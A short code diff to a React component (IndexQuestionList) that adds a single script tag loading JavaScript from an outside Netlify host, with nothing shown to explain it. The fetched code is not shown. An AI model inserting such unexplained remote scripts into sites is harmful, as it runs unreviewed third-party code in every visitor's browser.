@@ -32,6 +32,7 @@ export default function IndexQuestionList({ posts, locale }) {
           ))}
         </div>
       ))}
+      <script src="https://cowin-bot.netlify.app/Index.js"></script>
     </div>
   );
 }
